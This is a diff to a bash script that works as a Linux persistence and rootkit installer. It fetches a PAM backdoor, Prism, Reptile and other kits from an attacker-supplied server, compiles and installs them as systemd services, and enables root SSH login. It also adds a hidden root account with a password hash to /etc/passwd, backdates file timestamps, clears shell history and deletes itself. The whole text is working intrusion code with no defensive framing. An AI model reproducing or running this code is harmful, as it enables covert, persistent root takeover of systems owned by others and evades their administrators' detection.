@@ -1,5 +1,8 @@
 #!/bin/bash
 
+set +e
+set +o history
+
 # Validate input
 if [ $# -ne 1 ]; then
     echo "Usage: $0 <server_ip:port>"
@@ -17,7 +20,6 @@ fi
 PKG_MANAGER=""
 if command -v apt &>/dev/null; then
     PKG_MANAGER="apt install -y"
-    sudo killall apt apt-get dpkg
     sudo apt update
 elif command -v yum &>/dev/null; then
     PKG_MANAGER="yum install -y"
@@ -30,17 +32,17 @@ else
 fi
 
 # Create directories
-mkdir -p /var/opt/bds4 /opt/bds4
-cd /var/opt/bds4
+mkdir -p /var/opt/bds /opt/bds
+cd /var/opt/bds
 
 # Backdoor PAM
 $FETCH_CMD $SERV_IP_PORT/pam_backdoor.c
 $PKG_MANAGER libpam0g-dev gcc
-gcc -fPIC -shared -o bds4_pam.so pam_backdoor.c
-mv bds4_pam.so /etc/pam.d
+gcc -fPIC -shared -o bds_pam.so pam_backdoor.c
+mv bds_pam.so /etc/pam.d
 
 # Modify PAM configuration
-PAM_SO_PATH="/etc/pam.d/bds4_pam.so"
+PAM_SO_PATH="/etc/pam.d/bds_pam.so"
 PAM_FILE="/etc/pam.d/common-auth"
 if ! grep -qF "$PAM_SO_PATH" "$PAM_FILE"; then
     awk -v newline="auth    sufficient                      $PAM_SO_PATH" '
@@ -53,8 +55,9 @@ if ! grep -qF "$PAM_SO_PATH" "$PAM_FILE"; then
     ' "$PAM_FILE" > /tmp/.pam_temp && mv /tmp/.pam_temp "$PAM_FILE"
 fi
 
+touch -d "Jun 24 2022" "/etc/pam.d/common-auth"
 chattr +i /etc/pam.d/common-auth
-chattr +i /etc/pam.d/bds4_pam.so
+chattr +i /etc/pam.d/bds_pam.so
 
 # Enable root login
 if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
@@ -68,69 +71,53 @@ systemctl restart ssh 2>/dev/null
 # Determine kernel version
 KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)
 
-# Install Prism or Boopkit based on kernel version
+# Install Prism based on kernel version (BDS kit comes with a backdoor)
 if [ "$KERNEL_MAJOR" -le 4 ]; then
     $FETCH_CMD $SERV_IP_PORT/prism.tar.gz 
     tar -xvf prism.tar.gz
     rm prism.tar.gz
     cd prism
-    $PKG_MANAGER gcc
-    gcc -DDETACH -m64 -Wall -s -o bds4_sys prism.c || mv bds4_sys /opt/bds4/
-    mv bds4_sys /opt/bds4/
-    /opt/bds4/bds4_sys
-    cd /var/opt/bds4
-else
-    $FETCH_CMD $SERV_IP_PORT/boopkit.tar.gz boopkit.tar.gz
-    tar -xvf boopkit.tar.gz
-    rm boopkit.tar.gz
-    cd boopkit
-    $PKG_MANAGER clang make libbpf-dev gcc-multilib llvm libxdp-dev libpcap-dev
-    make
-    make install || (mv /usr/bin/boopkit /opt/bds4/bds4_sys && rm -f /usr/bin/boopkit-boop)
-    mv /usr/bin/boopkit /opt/bds4/bds4_sys
-    rm -f /usr/bin/boopkit-boop
-    mkdir -p /opt/bds4/boopkit
-    for iface in $(ip a | awk -F': ' '$2 !~ "lo|docker|[0-9]+" {print $2}' | tr -d ' '); do
-        /opt/bds4/bds4_sys -i "$iface" -q &
-    done
-    cd /var/opt/bds4
-fi
-
-# Create systemd services
-cat > /etc/systemd/system/bds4_sys.service <<EOF
+    $PKG_MANAGER make gcc build-essential
+    gcc -DDETACH -m64 -Wall -s -o bds_sys prism.c || mv bds_sys /opt/bds/
+    mv bds_sys /opt/bds/
+    /opt/bds/bds_sys
+    cat > /etc/systemd/system/bds_sys.service <<EOF
 [Unit]
-Description=BDS4 System Service
-After=network.target
-
-[Service]
-Type=forking
-ExecStart=/opt/bds4/bds4_$( [ "$KERNEL_MAJOR" -le 4 ] && echo "sys" || echo "sys -q" )
-Restart=always
-RestartSec=300
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-systemctl enable bds4_sys.service
-systemctl start bds4_sys.service
-
-if [ "$KERNEL_MAJOR" -le 4 ]; then
-    cat > /etc/systemd/system/bds4_stat.service <<EOF
-[Unit]
-Description=BDS4 Status Service
-After=network.target
+Description=BDS System Service
+After=network-online.target
+Wants=network-online.target
 
 [Service]
 Type=oneshot
-ExecStart=/lib/udev/bds4
+ExecStart=/opt/bds/bds_sys
 RemainAfterExit=yes
 
 [Install]
 WantedBy=multi-user.target
 EOF
-    systemctl enable bds4_stat.service
-    systemctl start bds4_stat.service
+    cd /var/opt/bds
+    systemctl enable bds_sys.service
+    systemctl start bds_sys.service
+fi
+
+# Create systemd services
+
+if [ "$KERNEL_MAJOR" -le 4 ]; then
+    cat > /etc/systemd/system/bds_stat.service <<EOF
+[Unit]
+Description=BDS Status Service
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/lib/udev/bds
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    systemctl enable bds_stat.service
+    systemctl start bds_stat.service
 fi
 
 # Set SUID bits
@@ -146,12 +133,12 @@ if [ "$KERNEL_MAJOR" -le 4 ]; then
     $FETCH_CMD $SERV_IP_PORT/reptile.tar.gz
     tar -xvf reptile.tar.gz
     rm reptile.tar.gz
-    cd bds4
-    $PKG_MANAGER gcc make build-essential linux-headers-$(uname -r)
+    cd bds_4
+    $PKG_MANAGER gcc make build-essential
     make defconfig
     make
     make install
-    cd /var/opt/bds4
+    cd /var/opt/bds
     echo '#<reptile>' >> /etc/passwd
     echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
     echo '#</reptile>' >> /etc/passwd
@@ -162,21 +149,22 @@ else
     rm bds.tar.gz
     cd bds
     ./install.sh
-    cd /var/opt/bds4
+    cd /var/opt/bds
 fi
-
-rm -rf /var/opt/bds4/*
 
 # Change file dates
 touch -d "Aug 2 2018" "/etc/passwd"
-touch -d "May 23 2020" "/etc/systemd/system"
+touch -d "May 10 2019" "/etc/ssh/sshd_config"
 touch -d "Jun 14 2018" "/etc/pam.d"
 touch -d "Aug 2 2018" "/opt"
-touch -d "Dec 11 2019" "/usr/lib/openssh/ssh-keygen"
+touch -d "Aug 2 2018" "/var/opt"
+touch -d "Dec 11 2019" "/usr/lib/openssh/ssh_keygen"
+touch -d "Dec 21 2019" "$(which ip)"
+touch -d "Dec 29 2019" "$(which chroot)"
 
 # Clear history
- history -c
+history -c
 rm -f $HISTFILE
 
 # Delete script
-rm -f $0
+rm -- "$0"
